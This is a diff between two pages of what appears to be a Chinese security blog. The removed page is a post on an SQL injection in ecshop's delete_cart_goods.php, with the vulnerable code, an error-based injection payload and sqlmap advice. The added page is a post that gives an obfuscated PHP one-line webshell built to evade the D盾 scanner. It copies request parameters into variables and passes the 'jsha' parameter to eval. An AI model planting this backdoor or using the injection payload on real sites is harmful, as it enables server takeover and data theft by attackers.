@@ -20,7 +20,7 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
   <meta name="renderer" content="webkit">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" , user-scalable="no"">
-  <title>ecshop(delete_cart_goods.php)注入漏洞乔巴Doctor</title>
+  <title>过D盾一句话乔巴Doctor</title>
   <link rel="shortcut icon" href>
   
     
@@ -107,8 +107,8 @@
             </header>
                 
 <header class="blog-post-page-title">
-    <h4>ecshop(delete_cart_goods.php)注入漏洞</h4>
-    <time datetime="2019-05-19T11:52:50.000Z"><i class="fa fa-clock-o"></i>2019-05-19</time>
+    <h4>过D盾一句话</h4>
+    <time datetime="2019-05-19T13:13:57.000Z"><i class="fa fa-clock-o"></i>2019-05-19</time>
     
     
     
@@ -126,18 +126,9 @@
     <article class="blog-post-block blog-post-page-content">
         <section>
             
-                <p>##ecshop注入一枚<br>应该是古老的注入吧，的新版貌似都不存在有这个文件<br>文件<br>delete_cart_goods.php<br>源码<br><a href="http://code.taobao.org/p/ecshop_modernshowmall/src/trunk/wwwroot/delete_cart_goods.php" target="_blank" rel="noopener">http://code.taobao.org/p/ecshop_modernshowmall/src/trunk/wwwroot/delete_cart_goods.php</a></p>
-<p>##注入语句</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if($_POST['id'])</span><br><span class="line">&#123;</span><br><span class="line">$sql = '<span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="string">'.$GLOBALS['</span>ecs<span class="string">']-&gt;table('</span>cart<span class="string">')." WHERE rec_id=".$_POST['</span><span class="keyword">id</span><span class="string">'];</span></span><br><span class="line"><span class="string">$GLOBALS['</span>db<span class="string">']-&gt;query($sql);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>问题还是一样的。这里的$_POST[‘id’]直接带入了query($sql)</li>
-</ul>
-<p><img src="./burp截图.png" alt="burp截图"><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="string">`etshop`</span>.<span class="string">`ecs_cart`</span> <span class="keyword">WHERE</span> rec_id=xxx</span><br><span class="line"><span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">'xxx'</span> <span class="keyword">in</span> <span class="string">'where clause'</span></span><br></pre></td></tr></table></figure></p>
-<p><em>提示找不到xxx这个字段。那我们随便写一个存在的不就好了~<br>首先来测试数字型的：<br><img src="./burp截图2.png" alt="burp截图2">
-</em>我们再测试下字符型的<br><img src="./burp截图3.png" alt="burp截图3"><br>*随便赋予id值，都会带入sql语句<br>比如:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></p>
-<p>*完整的sql语句就变成了<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="string">`etshop`</span>.<span class="string">`ecs_cart`</span> <span class="keyword">WHERE</span> rec_id=a <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></p>
-<p><img src="./burp截图4.png" alt="burp截图4"></p>
-<p>文章转自0day5<br>*直接用hackbar在在post里面添加id参数加’如果报错就可以直接s用sqlmap去跑，如果是ecshop自带的加密一般是解不开的。</p>
+                <center><strong>这个是在i春秋搬过来的，非原创请勿喷</strong></center>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_strint</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strrev($key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log1</span><span class="params">($log)</span></span>&#123;</span><br><span class="line">        lone(_strint(strrev($log)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lone</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $str = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">eval</span>($str.$key.$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value)</span><br><span class="line">    &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">isset</span>($jsha) ? $id : <span class="number">2</span>;</span><br><span class="line">log1($jsha);<span class="comment">//密码jsha</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
             
         </section>
@@ -145,7 +136,7 @@
         
 			
 				
-			<a href="/tags/cms/" rel="tag" data-toggle="tooltip" data-placement="top" title="Linux">cms</a>
+			<a href="/tags/一句话/" rel="tag" data-toggle="tooltip" data-placement="top" title="Linux">一句话</a>
 				
 			
 		
@@ -155,12 +146,10 @@
     	
     	
 		
-			<a href="/2019/05/19/过D盾一句话/" class="blog-post-page-readmore-prev" data-toggle="tooltip" data-placement="top" title="过D盾一句话">上一篇</a>
-		
 
 		
 		
-			<a href="/2019/05/19/中华人民共和国网络安全法/" class="blog-post-page-readmore-next" data-toggle="tooltip" data-placement="top" title="中华人民共和国网络安全法">下一篇</a>
+			<a href="/2019/05/19/ecshop-delete-cart-goods-php-注入漏洞/" class="blog-post-page-readmore-next" data-toggle="tooltip" data-placement="top" title="ecshop(delete_cart_goods.php)注入漏洞">下一篇</a>
 		
 
         <div style="clear: both;"></div>
@@ -263,7 +252,7 @@
                 return out;
             }
             // 生成
-            var qrcode= $('.post-qrcode-content-canvas').qrcode({width: 150,height: 150,text: toUtf8("http://meetdoctor.github.io/2019/05/19/ecshop-delete-cart-goods-php-注入漏洞/")}).hide();
+            var qrcode= $('.post-qrcode-content-canvas').qrcode({width: 150,height: 150,text: toUtf8("http://meetdoctor.github.io/2019/05/19/过D盾一句话/")}).hide();
             var canvas=qrcode.find('canvas').get(0);
             $('.post-qrcode-content-img').attr('src',canvas.toDataURL('image/jpg'));
         </script>
